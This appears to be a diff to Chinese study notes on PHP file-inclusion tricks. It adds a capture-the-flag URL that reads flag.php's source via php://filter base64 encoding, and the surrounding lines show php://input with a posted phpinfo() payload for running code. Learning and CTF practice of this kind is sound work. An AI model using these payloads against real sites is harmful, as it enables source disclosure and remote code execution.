@@ -28,6 +28,8 @@ php://filter 主要用于数据流打开时的筛选过滤应用，对于一体�
 1.php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）
 2.php://input + [POST DATA]执行php代码
 
+http://4d45bcb5-1f49-4c81-b3d6-e6bbc9a9b257.node5.buuoj.cn:81/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php
+
 如http://127.0.0.1/include.php?file=php://input
 [POST DATA部分]
 <?php phpinfo(); ?>
